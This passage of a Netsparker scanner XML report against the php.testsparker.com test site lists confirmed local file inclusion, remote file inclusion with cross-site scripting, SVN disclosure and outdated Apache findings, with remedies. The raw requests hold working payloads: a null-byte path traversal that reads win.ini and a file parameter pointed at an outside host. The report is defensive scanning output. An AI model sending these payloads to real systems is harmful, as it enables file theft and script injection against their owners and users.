&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;link type=&quot;text/css&quot; href=&quot;Generics/style.css&quot; rel=&quot;stylesheet&quot;/&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
				&lt;h2 class=&quot;title&quot;&gt;&lt;a href=&quot;artist.php#&quot;&gt;Artist Service&lt;/a&gt;&lt;/h2&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;
					&lt;p&gt;



&lt;table class=&quot;container&quot;&gt;&lt;thead&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;SURNAME&lt;/th&gt;&lt;th&gt;CREATION DATE &lt;/th&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr class=&quot;odd&quot;&gt;
&lt;td&gt;2 &lt;/td&gt;
&lt;td&gt;NICK &lt;/td&gt;
&lt;td&gt;WAHLBERG &lt;/td&gt;
&lt;td&gt;2006-02-15 04:34:33 &lt;/td&gt;
&lt;td&gt; &lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;even&quot;&gt;
&lt;td&gt;3 &lt;/td&gt;
&lt;td&gt;ED &lt;/td&gt;
&lt;td&gt;CHASE &lt;/td&gt;
&lt;td&gt;2006-02-15 04:34:33 &lt;/td&gt;
&lt;td&gt; &lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;odd&quot;&gt;
&lt;td&gt;4 &lt;/td&gt;
&lt;td&gt;JENNIFER &lt;/td&gt;
&lt;td&gt;DAVIS &lt;/td&gt;
&lt;td&gt;2006-02-15 04:34:33 &lt;/td&gt;
&lt;td&gt; &lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;even&quot;&gt;
&lt;td&gt;5 &lt;/td&gt;
&lt;td&gt;JOHNNY &lt;/td&gt;
&lt;td&gt;LOLLOBRIGIDA &lt;/td&gt;
&lt;td
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>14</WASC>
							<CWE>267</CWE>
							<CAPEC></CAPEC>
							<PCI31>6.5.6</PCI31>
							<PCI32>6.5.6</PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H</vector>

									<score>
										<type>Base</type>
										<value>9.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>9.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>9.0</value>
										<severity>Critical</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/process.php?file=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00.nsp</url>
					<type>Lfi</type>
					<severity>High</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a local file inclusion vulnerability, which occurs when a file from the target system is injected into the attacked server page.&lt;/p&gt;&lt;p&gt;Netsparker &lt;strong&gt;confirmed&lt;/strong&gt; this issue by reading some files from the target web server.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;The impact can vary, based on the exploitation and the read permission of the web server user. Depending on these factors, an attacker might carry out one or more of the following attacks:&lt;ul&gt;&lt;li&gt;Gather usernames via an &lt;code&gt;&quot;/etc/passwd&quot;&lt;/code&gt; file&lt;/li&gt;&lt;li&gt;Harvest useful information from the log files, such as &lt;code&gt;&quot;/apache/logs/error.log&quot;&lt;/code&gt; or &lt;code&gt;&quot;/apache/logs/access.log&quot;&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Remotely execute commands by combining this vulnerability with some other attack vectors, such as file upload vulnerability or log injection&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;If possible, do not permit appending file paths directly. Make them hard-coded or selectable from a limited hard-coded path list via an index variable.&lt;/li&gt;&lt;li&gt;If you definitely need dynamic path concatenation, ensure you only accept required characters such as &quot;a-Z0-9&quot; and do not allow &quot;..&quot; or &quot;/&quot; or &quot;%00&quot; (null byte) or any other similar unexpected characters.&lt;/li&gt;&lt;li&gt;It is important to limit the API to allow inclusion only from a directory and directories below it. This way you can ensure any potential attack cannot perform a directory traversal attack.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/&#39;&gt;Local File Inclusion Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>file</vulnerableparameter>
						<vulnerableparametervalue>/../../../../../../../../../../windows/win.iniï¿½.nsp</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /process.php?file=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00.nsp HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 1407
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:53 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	    &lt;span class=&quot;highlight&quot;&gt;; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]&lt;/span&gt;
MAPI=1
	&lt;!-- process.php load pages from path of the website. --&gt;
	&lt;!-- FIXME: File / directory permissions --&gt;
	&lt;!-- end #page --&gt;
&lt;/div&gt;

&lt;div id=&quot;footer&quot;&gt;
		&lt;p&gt;Copyright (c) 2010 testsparker.com. All rights reserved. Design by &lt;a href=&quot;http://www.freecsstemplates.org/&quot;&gt;Free CSS Templates&lt;/a&gt;.&lt;/p&gt;
	&lt;/div&gt;	&lt;!-- end #footer --&gt;
&lt;/body&gt;
&lt;/html&gt;
]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs><proof>
<key><![CDATA[File - C:\windows\win.ini]]></key>
<value><![CDATA[; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]]]></value>
</proof>
</proofs>


						<classification>
							<OWASP2013>A4</OWASP2013>
							<WASC>33</WASC>
							<CWE>98</CWE>
							<CAPEC>252</CAPEC>
							<PCI31>6.5.8</PCI31>
							<PCI32>6.5.8</PCI32>
							<HIPAA>164.306(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/.svn/all-wcprops</url>
					<type>SvnDisclosure</type>
					<severity>High</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker discovered an SVN repository file.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;SVN repository files can disclose SVN addresses, SVN usernames, and date information. While disclosures of this type do not provide chances of direct attack, they can be useful for an attacker when combined with other vulnerabilities or during the exploitation of some other vulnerabilities.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;p&gt;Do not leave SVN repository files on production environments. If there is a business requirement to do so, implement access control mechanisms to stop public access to SVN repository files.&lt;/p&gt;&lt;p&gt;You can also use &lt;code&gt;Export&lt;/code&gt; if you do one time deployments, instead of a checkout.&lt;/p&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /.svn/all-wcprops HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/.svn/all-wcprops
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
Content-Length: 1134
Last-Modified: Mon, 22 Feb 2010 16:06:53 GMT
Accept-Ranges: bytes
Content-Type: text/plain
Date: Fri, 29 Jun 2018 03:09:23 GMT
ETag: &quot;131000000013a0b-46e-480329f1c6140&quot;

&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 53
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP
END
nslookup.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 66
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/nslookup.php
END
page.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 62
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/page.php
END
process.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 65
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/process.php
END
style.css
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 63
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/style.css
END
hello.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 63
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/hello.php
END
products.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 66
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/products.php
END
conf.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 62
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/conf.php
END
artist.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 64
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/artist.php
END
index.php
&lt;span class=&quot;highlight&quot;&gt;K 25
svn:&lt;/span&gt;wc:ra_dav:version-url
V 63
/svn/msl_testbed/!svn/ver/445/testscript/Testsite-PHP/index.php
END
]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>13</WASC>
							<CWE>527</CWE>
							<CAPEC>118</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/process.php?file=http%3a%2f%2fr87.com%2fn%3f%00.nsp</url>
					<type>XssViaRfi</type>
					<severity>High</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected cross-site scripting via remote file inclusion, which makes it is possible to conduct cross-site scripting attacks by including arbitrary client-side dynamic scripts (&lt;em&gt;JavaScript, VBScript&lt;/em&gt;).&lt;/p&gt;&lt;p&gt;Cross-site scripting allows an attacker to execute a dynamic script (&lt;em&gt;JavaScript, VBScript&lt;/em&gt;) in the context of the application. This allows several different attack opportunities, mostly hijacking the current session of the user or changing the look of the page by changing the HTML on the fly to steal the user&#39;s credentials. This happens because the input entered by the user has been interpreted as HTML/JavaScript/VBScript by the browser.&lt;/p&gt;&lt;p&gt;Cross-site scripting targets the users of the application instead of the server. Although this is limitation, since it allows attackers to hijack other users&#39; sessions, an attacker might attack an administrator to gain full control over the application.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;There are many different attacks that can be leveraged through the use of cross-site scripting, including:&lt;ul&gt;&lt;li&gt;Hijacking user&#39;s active session.&lt;/li&gt;&lt;li&gt;Changing the look of the page within the victim&#39;s browser.&lt;/li&gt;&lt;li&gt;Mounting a successful phishing attack.&lt;/li&gt;&lt;li&gt;Intercepting data and performing man-in-the-middle attacks.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;The issue occurs because the browser interprets the input as active HTML, Javascript or VbScript. To avoid this, all input and output from the application should be filtered. Output should be filtered according to the output format and location. Typically, the output location is HTML. Where the output is HTML, ensure all active content is removed prior to its presentation to the server.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://labs.portcullis.co.uk/tools/xss-shell/&#39;&gt;XSS Shell&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/remote-file-inclusion-vulnerability/&#39;&gt;Remote File Inclusion Vulnerabilities Information &amp;amp; Prevention&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://labs.portcullis.co.uk/tools/xss-tunnel/&#39;&gt;XSS Tunnelling&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross_site_scripting&#39;&gt;OWASP - Cross-Site Scripting&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/&#39;&gt;Cross-site Scripting Web Application Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.microsoft.com/en-us/download/details.aspx?id=28589&#39;&gt;[ASP.NET] - Microsoft Anti-XSS Library&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet&#39;&gt;OWASP XSS Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/AntiSamy&#39;&gt;OWASP AntiSamy Java&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>file</vulnerableparameter>
						<vulnerableparametervalue>http://r87.com/n?ï¿½.nsp</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /process.php?file=http%3a%2f%2fr87.com%2fn%3f%00.nsp HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 1383
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:56 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	    NETSPARKER_F0M1-44353702950-&lt;span class=&quot;highlight&quot;&gt;&lt;script&gt;netsparkerRFI(0x066666)&lt;/script&gt;&lt;/span&gt;	&lt;!-- process.php load pages from path of the website. --&gt;
	&lt;!-- FIXME: File / directory permissions --&gt;
	&lt;!-- end #page --&gt;
&lt;/div&gt;

&lt;div id=&quot;footer&quot;&gt;
		&lt;p&gt;Copyright (c) 2010 testsparker.com. All rights reserved. Design by &lt;a href=&quot;http://www.freecsstemplates.org/&quot;&gt;Free CSS Templates&lt;/a&gt;.&lt;/p&gt;
	&lt;/div&gt;	&lt;!-- end #footer --&gt;
&lt;/body&gt;
&lt;/html&gt;
]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A3</OWASP2013>
							<WASC>8</WASC>
							<CWE>79</CWE>
							<CAPEC>19</CAPEC>
							<PCI31>6.5.7</PCI31>
							<PCI32>6.5.7</PCI32>
							<HIPAA>164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>ApacheOutOfDate</type>
					<severity>High</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified you are using an out-of-date version of Apache.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Since this is an old version of the software, it may be vulnerable to attacks.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;p&gt;Please upgrade your installation of Apache to the latest stable version.&lt;/p&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://httpd.apache.org/download.cgi&#39;&gt;Downloading the Apache HTTP Server&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
&lt;span class=&quot;highlight&quot;&gt;Server: Apache/2.2.8 (Win32) PHP/5.2.6
&lt;/span&gt;
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Identified Version">&lt;![CDATA[2.2.8]]&gt;</info>
							<info name="Latest Version">&lt;![CDATA[2.4.33]]&gt;</info>
							<info name="Vulnerability Database">&lt;![CDATA[Result is based on 2018-06-28 vulnerability database content.]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A9</OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC>310</CAPEC>
							<PCI31>6.2</PCI31>
							<PCI32>6.2</PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C1</OWASPPC>

						</classification>

						<knownvulnerabilities>
								<knownvulnerability>
									<title>Apache mod_proxy_balancer CSRF Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2007-6420</references>
									<affectedversions>2.2.0 to 2.2.8</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_proxy_http Interim Response Denial of Service Vulnerability </title>
									<severity>Medium</severity>
									<references>CVE-2008-2364</references>
									<affectedversions>2.2.0 to 2.2.8</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_proxy_ftp Wildcard Characters Cross-Site Scripting Vulnerability </title>
									<severity>Low</severity>
									<references>CVE-2008-2939</references>
									<affectedversions>2.2.0 to 2.2.9</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_proxy Remote Denial Of Service Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2009-1890</references>
									<affectedversions>2.2.0 to 2.2.11</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache HTTP Server mod_deflate Denial of Service Vulnerability </title>
									<severity>Medium</severity>
									<references>CVE-2009-1891</references>
									<affectedversions>2.2.0 to 2.2.11</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache APR-util apr_brigade_vprintf Off By One Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2009-1956</references>
									<affectedversions>2.2.0 to 2.2.11</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache APR-util xml/apr_xml.c Denial of Service Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2009-1955</references>
									<affectedversions>2.2.0 to 2.2.11</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache APR-util apr_strmatch_precompile() Integer Underflow Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2009-0023</references>
									<affectedversions>2.2.0 to 2.2.11</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache APR and APR-util Multiple Integer Overflow Vulnerabilities</title>
									<severity>Low</severity>
									<references>CVE-2009-2412</references>
									<affectedversions>2.2.0 to 2.2.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_proxy_ftp Module Insufficient Input Validation Denial Of Service Vulnerability </title>
									<severity>Medium</severity>
									<references>CVE-2009-3094</references>
									<affectedversions>2.2.0 to 2.2.13</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_proxy_ftp Remote Command Injection Vulnerability </title>
									<severity>Low</severity>
									<references>CVE-2009-3095</references>
									<affectedversions>2.2.0 to 2.2.13</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_isapi Memory Corruption Vulnerability </title>
									<severity>Low</severity>
									<references>CVE-2010-0425</references>
									<affectedversions>2.2.0 to 2.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
